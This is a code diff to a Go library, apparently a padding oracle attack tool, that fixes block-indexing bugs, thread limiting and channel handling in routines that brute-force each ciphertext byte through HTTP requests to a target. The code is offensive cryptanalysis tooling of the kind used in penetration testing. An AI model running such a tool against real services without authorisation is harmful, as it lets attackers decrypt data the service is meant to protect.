@@ -1,6 +1,7 @@
 package libpadoracle
 
 import (
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"sync"
@@ -16,13 +17,14 @@ func PadOperations(cfg Config, cipherText []byte, decipherChan chan Data) {
 		cipherText = append(cfg.IV, cipherText...)
 	}
 	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
-	if lastBlockLen := len(Blocks[len(Blocks)]); lastBlockLen != cfg.BlockSize {
+	// fmt.Println(Blocks)
+	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
 		err := errors.New(fmt.Sprintf("Invalid Block Size at Block #%d: %v bytes", len(Blocks), lastBlockLen))
 		panic(err)
 	}
-	wg.Add(len(Blocks))
+	wg.Add(len(Blocks) - 1)
 	for blockNum, blockData := range Blocks[1:] {
-		go PerBlockOperations(&wg, cfg, threadCh, decipherChan, blockNum, blockData, Blocks[blockNum-1])
+		go PerBlockOperations(&wg, cfg, threadCh, decipherChan, blockNum+1, blockData, Blocks[blockNum])
 	}
 	wg.Wait()
 }
@@ -33,16 +35,16 @@ func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, 
 	blockDecipherChan := make(chan byte)
 
 	defer func() {
-		close(blockDecipherChan)
 		wg.Done()
 	}()
 	returnData := Data{}
 	decipheredBlockBytes := []byte{}
 	wg2 := sync.WaitGroup{}
 	for byteNum, byteData := range blockData { // Iterate over each byte
-		fmt.Printf("Checking Block: %d; Byte %d; val: %d\n", blockNum, byteNum, byteData)
+		fmt.Printf("Checking Block: %d; Byte %d; val: %v\n", blockNum, byteNum, hex.EncodeToString([]byte{byteData}))
 		wg2.Add(1)
 		for i := 0; i < 256; i++ {
+			threadCh <- struct{}{}
 			go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes)
 		}
 		go func() {
@@ -50,6 +52,7 @@ func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, 
 			decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
 		}()
 		wg2.Wait()
+
 	}
 	returnData.BlockNumber = blockNum
 	returnData.EncryptedBlockData = blockData
@@ -78,5 +81,8 @@ func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipher
 	if CheckResponse(httpResp, strResponseBody) {
 		defer wg.Done()
 		blockDecipherChan <- byte(bruteForceByteValue)
+		if byteNum == cfg.BlockSize-1 {
+			close(blockDecipherChan)
+		}
 	}
 }
